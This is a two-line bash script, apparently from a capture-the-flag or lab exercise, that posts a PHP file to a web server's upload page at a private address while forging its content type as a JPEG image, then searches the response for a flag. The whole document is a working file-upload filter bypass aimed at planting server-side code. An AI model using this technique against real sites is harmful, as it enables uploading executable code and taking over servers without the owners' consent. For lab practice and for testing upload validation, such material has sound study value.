#!/bin/bash
curl  -X POST -F "uploaded=@/tmp/test.php;type=image/jpg" -F "Upload=Upload" "http://192.168.1.11/index.php?page=upload" | grep "flag"
